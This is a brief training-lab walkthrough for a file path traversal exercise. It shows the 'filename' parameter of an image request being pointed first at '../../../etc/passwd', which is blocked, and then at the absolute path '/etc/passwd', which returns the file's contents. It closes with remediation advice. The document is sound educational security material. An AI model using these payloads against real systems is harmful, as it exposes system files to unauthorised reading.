## 🧪 Lab: File Path Traversal - Traversal Sequences Blocked with Absolute Path Bypass  
**Level**: Practitioner  
**Date**: June 12, 2025  
**Goal**: Read `/etc/passwd` despite traversal sequences being blocked.

---

### 🧰 Tools
- Burp Suite (Repeater / Interceptor)

---

### 🧭 Steps

1. **Find and intercept vulnerable image URL**  
   - Navigate to the product page and intercept the image request:
     ```
     GET /image?filename=218.png
     ```

2. **Send to Repeater**

3. **Attempt traversal payload**
   - Try:
     ```
     filename=../../../etc/passwd
     ```
   - This fails, as traversal sequences are blocked.

4. **Bypass with absolute path**
   - Test direct path injection:
     ```
     filename=/etc/passwd
     ```

5. **Send request**
   - Successful response shows contents:
     ```
     root:x:0:0:root:/root:/bin/bash
     ...
     ```

---

### 💣 Payload
```
/etc/passwd
```

---

### 🔒 Remediation
- Sanitize and validate all user-supplied file paths.
- Use allow-lists for specific, permitted filenames.
- Restrict file access to safe directories only.
- Never allow absolute paths in user-controlled input.